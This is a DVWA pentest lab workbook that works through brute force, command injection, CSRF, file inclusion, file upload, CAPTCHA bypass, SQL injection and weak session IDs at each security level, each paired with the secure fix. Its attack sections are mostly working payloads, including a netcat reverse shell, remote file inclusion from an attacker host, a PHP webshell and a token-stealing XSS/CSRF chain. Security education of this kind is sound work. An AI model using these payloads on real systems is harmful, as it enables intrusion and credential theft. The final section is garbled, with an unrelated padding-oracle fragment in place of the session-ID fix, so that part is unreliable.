DVWA — End-to-End Pentest Lab Workbook

A tutor-style, methodology-first path through every DVWA module on your own http://localhost:4280, across all four security levels. Built for the From-Dev-To-Attacker roadmap — your Phase 2/3 web lab, the companion to the Juice Shop workbook.

Scope: authorized, local, intentionally vulnerable target. Nothing here leaves your machine.

Version check first. This workbook targets DVWA v2.5 "Vulnerable APIs" (latest release, 29 Jan 2025 — FACT: Verified from GitHub releases). The 2.x line is a full rewrite vs. the old 1.x walkthroughs you'll find online, so two things changed that matter: PHPIDS was removed (there is no WAF layer to evade here — FACT: Verified), and the Docker image serves on port 4280, not 80. Confirm your build from the footer of any page, or the git tag: 
# in your DVWA checkout
git -C DVWA describe --tags            # expect v2.5 (or master ahead of it)
git -C DVWA log --oneline -1
If your menu is missing Authorisation Bypass, Open HTTP Redirect, Cryptography or API, you're on an older build (1.x / early 2.x) — tell me and I'll re-map those modules.

How to use this workbook

DVWA is not a scoreboard of challenges — it's 18 modules, each solvable at four security levels: Low Medium High Impossible. The level ladder is the entire curriculum. For a developer moving into offensive work, this is the highest-signal lab you'll run, because every module ships a View Source button and a Compare All Levels view: you exploit low.php, then read why medium.php / high.php fail to stop you, then read impossible.php — the reference secure implementation. That low→impossible diff is the dev→pentester mental model.

  1. Work each module top-down: Low → Medium → High → Impossible. Don't skip to High; the point is seeing what each control adds and how it's bypassed.
  2. Read the source every time. After you solve a level, open View Source and diff it against the next. This is the step most people skip and it's where the learning is.
  3. Write a finding card per module (template at the end). Treat your own localhost like a client engagement — this builds the muscle and the report portfolio your roadmap needs.
  4. Grading legend — two independent scales (your house rule), kept distinct:
EVIDENCE (did you prove it?): VERIFIED reproduced w/ impact · STRONG SIGNAL · WEAK SIGNAL · THEORETICAL
FACT (is the claim confirmed?): Verified primary source this session · Likely · Unverified

Note on FACT grades below: module mechanics and payloads for DVWA are stable and well-established (mostly Likely; the v2.5 structural facts are Verified). CWE IDs and OWASP category numbers are marked Likely unless you confirm them against the live source/MITRE this session — per your own rule, a mapping written in a guide is not a verified fact. The authoritative source for each fix is the impossible.php you can read on your own box.

00 · Setup, recon & method

A. Run it (Docker — recommended)

git clone https://github.com/digininja/DVWA.git && cd DVWA
docker compose up -d                 # web + MariaDB
# → http://localhost:4280   login: admin / password
# Then: "Setup DVWA" (left menu) → "Create / Reset Database" → log in again.

Docker default security level in compose.yml is impossible (FACT: Verified). Set it to low to start, either in the DVWA Security menu each session, or persistently:

# compose.yml, under the dvwa service:
environment:
  - DB_SERVER=db
  - DEFAULT_SECURITY_LEVEL=low       # low | medium | high | impossible

B. Run it (manual — XAMPP / LAMP, if you didn't use Docker)

# Debian/Kali-style packages
sudo apt install -y apache2 mariadb-server php php-mysqli php-gd libapache2-mod-php
cp config/config.inc.php.dist config/config.inc.php
# config.inc.php defaults:
#   db_user = dvwa   db_password = p@ssw0rd   db_database = dvwa

# Place files under the web root, then browse to  http://127.0.0.1/DVWA/setup.php

E. The stack (so the bugs make sense)

Server-rendered PHP on Apache, data in MariaDB/MySQL (so SQLi is classic mysqli/error-based, not NoSQL). State is cookie-driven: security cookie selects which of the four PHP files handles your request. There is no SPA, no JWT, no PHPIDS in 2.x. The pedagogical spine is the four-file-per-module layout — low/medium/high/impossible.php — which lets you read the exact control added at each step.

01 · Brute Force

OWASP A07:2021 Identification & Auth FailuresCWE-307CWE-799FACT: Likely (mappings)

Login form with no (Low) / weak (Med/High) anti-automation. Target admin; wordlist e.g. rockyou.txt with password seeded in.

LOW GET creds, no protection ★reveal

Creds in the query string, unlimited attempts. Hydra against the GET form; the failure string is Username and/or password incorrect.

hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4280 \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=$SID; security=low"

Or Burp Intruder (Sniper on password, filter by response length). EVIDENCE: VERIFIED once you recover admin:password.

MEDIUM adds sleep() on failure ★★reveal

Source adds mysqli_real_escape_string() (kills SQLi on the form) and a sleep(2) delay after a failed login. It does not lock out — it only slows you. Brute force still works; just throttle threads and wait.

hydra -t 4 -l admin -P rockyou.txt 127.0.0.1 -s 4280 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=$SID; security=medium"

Lesson: a fixed delay is not a rate limit. It costs the attacker wall-clock time, nothing else.

HIGH adds an anti-CSRF user_token ★★★reveal

Each request must carry a one-time user_token hidden field; a stale/absent token is rejected. Hydra's simple form module can't harvest a fresh token per request, so you script it (grab token → submit → repeat) or use Burp Intruder with the "Recursive grep" payload type to pull the next user_token out of each response. There's also a randomised failure sleep.

# Pattern: GET page, regex out user_token, POST guess with it, repeat.
# Burp Macro / Intruder recursive-grep on name="user_token" value="([0-9a-f]+)"

Lesson: CSRF tokens incidentally raise the cost of blind automation, but they are not a brute-force control — they don't limit attempts, they just force stateful scraping.

IMPOSSIBLE the reference fix reveal

Read impossible.php: it uses PDO prepared statements, the anti-CSRF token, and an account lockout — after 3 failed attempts the account is temporarily locked (failed_login count + timestamp), and it uses a constant-ish response regardless of whether the user exists. That combination — lockout + token + parametrised query — is what actually defeats brute force.

Fix to recommend: rate-limit + progressive lockout + MFA; never leak user-existence via timing or message. CWE-307 Improper Restriction of Excessive Auth Attempts. FACT: Likely — confirm the exact lockout logic in your source.

02 · Command Injection

OWASP A03:2021 InjectionCWE-78FACT: Likely (mappings)

A "ping" box passes your input into a shell ping. Linux containers use ping -c 4 <ip>.

LOW raw concatenation ★reveal 
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
$(id)        # command substitution

EVIDENCE: VERIFIED when id/uid= appears in the output. Pop a shell: 127.0.0.1; busybox nc <you> 4444 -e sh (lab only).

MEDIUM blacklist of && and ; ★★reveal

Source does str_replace(['&&',';'], '', $target) — a denylist. It misses every other shell metacharacter:

127.0.0.1 | id            # pipe not filtered
127.0.0.1 & id            # single & survives (only && stripped)
127.0.0.1 || id
127.0.0.1 %0a id          # newline (URL-encoded) in some contexts

Lesson: denylists of "bad strings" are endlessly bypassable. str_replace of two tokens leaves |, ||, &, backticks, $(), newline.

HIGH bigger blacklist — one gap ★★★reveal

The denylist grows (&, ;, |, -, $, (,), backtick, || …) but the classic DVWA bug is the filter strips "| " (pipe-space) not "|" (pipe, no space). So drop the space:

127.0.0.1|id              # no space after the pipe → survives the blacklist

Lesson: blacklist entries are literal. An off-by-one in the token ("| " vs "|") reopens the whole class. FACT: Likely — verify the exact array in your high.php.

IMPOSSIBLE the reference fix reveal

impossible.php splits the input on ., checks each of the 4 octets with is_numeric() via stripslashes+explode, and only then builds the command — i.e. strict input validation / allowlisting to an IPv4 shape. No shell metacharacter can survive four numeric-octet checks.

Fix to recommend: never pass user input to a shell; use a native API (fsockopen/ICMP lib) or, if you must shell out, validate to a strict allowlist and use argument arrays, not string concatenation. CWE-78. FACT: Likely

03 · CSRF

OWASP A01:2021 Broken Access ControlCWE-352FACT: Likely (mappings)

A "change password" form. Goal: craft a page that changes the victim's password when they visit it while logged in.

LOW GET, no token ★reveal

Password change is a GET with no anti-CSRF token. A single malicious URL / auto-submitting image does it:

<img src="http://localhost:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">

EVIDENCE: VERIFIED when the victim's password changes with no interaction beyond page load.

MEDIUM checks Referer ★★reveal

Source requires the Referer header to strpos()-contain the server host name. Weak check — satisfy it by hosting the attack page so the host string appears in the path/host, or name your file to include the host:

# If SERVER_NAME is "localhost", a Referer that merely CONTAINS it passes.
# e.g. attacker page at  http://attacker/localhost/evil.html  → Referer contains "localhost"

Lesson: Referer substring checks are trivially satisfiable and the header is often absent/spoofable. Not a CSRF control.

HIGH anti-CSRF user_token ★★★★reveal

Now a per-request user_token is required. Pure CSRF is defeated — unless you can read the token cross-origin, which needs a separate bug (e.g. the Stored/Reflected XSS module) to exfiltrate it. That chain is the real lesson:

# Chain: XSS on same origin → fetch the change-password page →
# scrape user_token → submit new password with the live token.
fetch('/vulnerabilities/csrf/').then(r=>r.text()).then(h=>{
  var t=h.match(/user_token' value='([0-9a-f]+)/)[1];
  location='/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&user_token='+t+'&Change=Change';
});

Lesson: CSRF tokens work only if the origin has no XSS. CSRF + XSS is a canonical chain — exactly the kind of cross-surface thinking to write up.

IMPOSSIBLE the reference fix reveal

impossible.php requires the current password to change it, uses the anti-CSRF token, and uses PDO. Requiring the current password defeats both blind CSRF and the XSS-assisted chain (attacker doesn't know it).

Fix to recommend: anti-CSRF tokens (SameSite=strict cookies as defence-in-depth) + re-authentication for sensitive actions. CWE-352. FACT: Likely

04 · File Inclusion (LFI / RFI)

OWASP A03:2021 InjectionCWE-98CWE-22FACT: Likely (mappings)

?page=include.php passes a filename into PHP include(). LFI reads/executes local files; RFI (if allow_url_include=On) pulls a remote shell.

LOW no filtering ★reveal 
# LFI — path traversal
?page=../../../../etc/passwd
?page=../../../../var/log/apache2/access.log   # → log poisoning → RCE
# RFI (needs allow_url_include=On)
?page=http://<attacker>/shell.txt
# PHP wrappers
?page=php://filter/convert.base64-encode/resource=../low.php   # exfil source
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id

EVIDENCE: VERIFIED on /etc/passwd read or wrapper execution.

MEDIUM str_replace of http:// and ../ ★★reveal

Source strips "http://", "https://", "../", "..\" — once, non-recursively. Defeat with nesting or absolute paths:

?page=....//....//....//etc/passwd        # "../" removed once → "../" remains
?page=/etc/passwd                          # absolute path, no ../ needed
?page=hthttp://tp://<attacker>/shell.txt    # nested scheme survives one strip

Lesson: single-pass str_replace is defeated by the "doubled token" trick — removing one instance from the middle reassembles the forbidden string.

HIGH fnmatch("file*") allowlist ★★★reveal

Source requires the page to match file* (or be include.php). Traversal strings fail the match — but the file:// wrapper satisfies file*:

?page=file:///etc/passwd
?page=file:///var/www/html/vulnerabilities/fi/source/high.php

Lesson: prefix allowlists (file*) collide with scheme names. FACT: Likely — confirm the fnmatch pattern in your source.

IMPOSSIBLE the reference fix reveal

impossible.php allowlists the exact filenames (include.php, file1.php, file2.php, file3.php) and rejects everything else — a strict value allowlist, not pattern matching.

Fix to recommend: never pass user input to include; map an opaque ID to a server-side filename allowlist; disable allow_url_include/allow_url_fopen. CWE-98 PHP Remote File Inclusion / CWE-22 Path Traversal. FACT: Likely

05 · File Upload

OWASP A03/A05CWE-434FACT: Likely (mappings)

Upload lands in hackable/uploads/, web-reachable. Goal: upload a PHP webshell and browse to it. Pair with the File Inclusion module to execute non-.php payloads.

LOW no checks ★reveal 
# shell.php
<?php system($_GET['c']); ?>
# then browse:
http://localhost:4280/hackable/uploads/shell.php?c=id

EVIDENCE: VERIFIED on command output.

MEDIUM checks MIME type & size ★★reveal

Source checks $_FILES['type'] == 'image/jpeg'|'image/png' — a client-supplied header. Intercept in Burp and change Content-Type to image/jpeg while keeping PHP content:

Content-Type: image/jpeg     # spoofed; body is still <?php system($_GET['c']);?>

Lesson: the Content-Type in a multipart part is attacker-controlled. Never trust it. EVIDENCE: VERIFIED (well-documented DVWA path).

HIGH extension + getimagesize() ★★★★reveal

Source checks the filename ends in .jpg/.png/.jpeg and that getimagesize() succeeds (real image dimensions). Make a polyglot: valid image header + PHP appended, named .jpg, then execute it via the File Inclusion module (which will include() any path):

exiftool -Comment='<?php system($_GET["c"]); ?>' real.jpg -o shell.jpg
# upload shell.jpg (passes getimagesize), then:
/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.jpg&c=id

Lesson: content checks (getimagesize) don't stop a polyglot; the kill is combining upload + an include sink. Cross-module chain — write it up as one finding.

IMPOSSIBLE the reference fix reveal

impossible.php re-encodes the image with imagecreatefromjpeg()/imagecreatefrompng() (destroying any appended PHP), generates a random filename, uses the anti-CSRF token, and verifies the real type.

Fix to recommend: store uploads outside the web root, random server-assigned names, re-encode/transcode media, serve from a non-executing path, validate real content type. CWE-434 Unrestricted Upload of File with Dangerous Type. FACT: Likely

06 · Insecure CAPTCHA

OWASP A04:2021 Insecure Design / A07CWE-287CWE-841FACT: Likely (mappings)

A two-step "change password with reCAPTCHA" flow. The bug is flawed multi-step logic, not the CAPTCHA crypto. Needs reCAPTCHA keys configured to render, but the logic flaw is the lesson.

LOW trust a client "step" flag ★★reveal

Step 1 validates the CAPTCHA and shows a confirm form; step 2 changes the password. The server decides which step you're on from a hidden/POST parameter (step=2) and/or passed_captcha, so you skip the CAPTCHA by POSTing step 2 directly:

POST /vulnerabilities/captcha/
password_new=pwn&password_conf=pwn&step=2&Change=Change    # no CAPTCHA solved

EVIDENCE: VERIFIED when the password changes without a CAPTCHA.

MEDIUM hidden passed_captcha flag ★★reveal

Source now sets a hidden field passed_captcha=true after step 1 and trusts it on step 2. Set it yourself:

POST ... password_new=pwn&password_conf=pwn&step=2&passed_captcha=true&Change=Change

Lesson: never trust a client-echoed "I already passed the check" flag. State belongs server-side.

HIGH hardcoded backdoor in the validator ★★★reveal

High merges both steps and really calls recaptcha_check_answer() — but the source leaves a developer backdoor (an actual DEV NOTE in the HTML). The check is:

if ( $resp ||
     ( $_POST['g-recaptcha-response'] == 'hidd3n_valu3'
       && $_SERVER['HTTP_USER_AGENT'] == 'reCAPTCHA' ) ) { ... }

So satisfy the backdoor branch — in Burp, set the POST param and the User-Agent header:

POST /vulnerabilities/captcha/
User-Agent: reCAPTCHA
...&g-recaptcha-response=hidd3n_valu3&password_new=pwn&password_conf=pwn&step=1&Change=Change

EVIDENCE: VERIFIED · FACT: Verified (the hidd3n_valu3 + User-Agent: reCAPTCHA backdoor is in high.php). Lesson: debug/dev backdoors shipped to prod are a live finding class — grep code for magic constants and header checks.

IMPOSSIBLE the reference fix reveal

impossible.php verifies the CAPTCHA server-side on the same request that performs the change, requires the current password, uses the anti-CSRF token and PDO, and never trusts a client step/passed flag.

Fix to recommend: keep all multi-step state server-side (session), re-verify every gate on the action request, require re-auth. CWE-841 Improper Enforcement of Behavioral Workflow. FACT: Likely

07 · SQL Injection

OWASP A03:2021 InjectionCWE-89FACT: Likely (mappings)

"User ID" box → SELECT first_name, last_name FROM users WHERE user_id = '$id'. Two columns returned → UNION has 2 columns.

LOW string concat, in-band ★reveal 
1' OR '1'='1              # dump all rows
' UNION SELECT user, password FROM users-- -     # creds (MD5 hashes)
' UNION SELECT @@version, database()-- -
' UNION SELECT table_name, 2 FROM information_schema.tables-- -

Crack the MD5s (5f4dcc3b5aa765d61d8327deb882cf99 = password). Or just automate:

sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SID; security=low" --batch --dump -T users

EVIDENCE: VERIFIED on hash dump.

MEDIUM dropdown + mysqli_real_escape_string, numeric ★★reveal

Input comes from a POST dropdown and is escaped, but it's used numerically (no quotes in the query): WHERE user_id = $id. Escaping doesn't help an unquoted integer context — inject directly (via Burp, since the UI is a dropdown):

id=1 UNION SELECT user, password FROM users-- -
id=1 OR 1=1

Lesson: mysqli_real_escape_string only protects quoted string contexts. An unquoted numeric parameter is wide open despite escaping. Classic false sense of security.

HIGH separate-page input + LIMIT 1 ★★★reveal

The ID is set via a separate window/session var to defeat trivial automation, and the query appends LIMIT 1. Comment out the limit:

' UNION SELECT user, password FROM users-- -
# the trailing LIMIT 1 is neutralised by the -- - comment

Lesson: moving input to another request only raises automation friction; the injection class is identical. Point sqlmap at the input page with --second-order if needed.

IMPOSSIBLE the reference fix reveal

impossible.php uses PDO prepared statements with a bound parameter, checks the input is_numeric, uses the anti-CSRF token, and returns exactly one row. Parameterisation removes the injection entirely regardless of input.

Fix to recommend: parameterised queries / ORM bind params everywhere; never concatenate. CWE-89. FACT: Likely

08 · SQL Injection (Blind)

OWASP A03:2021 InjectionCWE-89FACT: Likely (mappings)

Same query, but the app returns only "User ID exists / missing" — no data. Infer bit-by-bit via boolean and time.

LOW boolean & time-based ★★reveal 
# Boolean
1' AND '1'='1-- -          # "exists"
1' AND '1'='2-- -          # "missing"  → oracle confirmed
# Extract: is first char of db version '5'?
1' AND SUBSTRING(@@version,1,1)='5'-- -
# Time-based (no visible difference needed)
1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(3),0)-- -
sqlmap -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SID; security=low" --technique=BT --batch --dump -T users

EVIDENCE: VERIFIED on extracted creds.

MEDIUM dropdown + escaping, numeric context ★★reveal

As with Module 07 Medium: POST, escaped, numeric context — inject without quotes:

id=1 AND IF(SUBSTRING(user(),1,1)='r',SLEEP(3),0)
HIGH cookie/second-page input + LIMIT ★★★reveal

Input moved to a separate request; payloads unchanged, terminate with -- - to drop LIMIT. Feed sqlmap the right request with the security=high cookie and the second-order input page.

IMPOSSIBLE the reference fix reveal

PDO prepared statement + is_numeric + anti-CSRF token — identical defence to in-band SQLi. Blindness is a property of the response, not the fix; parameterisation kills both. CWE-89. FACT: Likely

09 · Weak Session IDs

OWASP A07:2021 Identification & Auth FailuresCWE-330CWE-384FACT: Likely (mappings)

A "Generate" button issues a dvwaSession cookie. Analyse its predictability across levels. Capture several in Burp Sequencer or just by clicking + reading Set-Cookie.

LOW sequential integer ★reveal

dvwaSession = 1, 2, 3 … — a simple incrementing counter. Trivially predictable → session hijack by guessing the next value.

EVIDENCE: VERIFIED by observing monotonic increments.

MEDIUM time() ★★reveal

The ID is the current Unix timestamp. Low entropy and externally knowable — predict/bracket it from the response Date: header and brute a small window.

HIGH md5(sequential) ★★★reveal

The ID is md5() of an incrementing integer. Looks random, isn't: hash small integers until one matches an observed cookie, then predict the next.

for i in $(seq 1 100000); do echo -n $i | md5sum; done | grep <observed-md5>

Lesson: hashing a predictable seed yields a predictable output. Entropy must come from a CSPRNG, not from obfuscating a counter.

IMPOSSIBLE the reference fix reveal

python3 -c 'import base64
ct=base64.b64decode(open("ct.b64").read()); pt=b"...known..."

Medium tightens the scheme but leaves a structural flaw (predictable key/IV or a forgeable token whose success string is hardcoded — e.g. "Welcome administrator Sweep"). EVIDENCE: VERIFIED (AES-CBC padding oracle) · FACT: Likely on exact endpoint/param names — confirm in high.php/check_token_high.php. This is the module's crown jewel — tie it to your OSWE crypto patterns.
